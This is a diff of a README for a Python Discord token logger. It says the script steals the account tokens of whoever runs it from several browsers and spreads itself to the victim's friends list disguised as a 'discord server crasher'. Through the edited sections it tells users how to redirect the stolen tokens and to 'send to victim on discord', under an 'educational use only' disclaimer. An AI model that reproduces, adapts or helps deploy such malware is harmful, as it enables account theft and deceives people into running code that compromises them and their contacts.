@@ -6,7 +6,7 @@ DO NOT RUN THIS ON YOUR COMPUTER if you want to see what it does i recomend you 
 
 This python script when you run it will token log the person and then send the file (bomber.py) to everyone on there friends list saying its a discord server crasher.
 
-It token logs from
+## It token logs from
 
 Chrome
 
@@ -21,6 +21,8 @@ Opera
 Brave
 
 Yandex
+
+## instuctions
 
 If you want to change were it sends the token to.
 
@@ -42,4 +44,4 @@ try:
 
 8. send to victim on discord
 
-**disclaimer this is for educational use only and i am not responsible for your actions or uses of this code**
+# **!!Disclaimer this is for educational use only and i am not responsible for your actions or uses of this code!!**
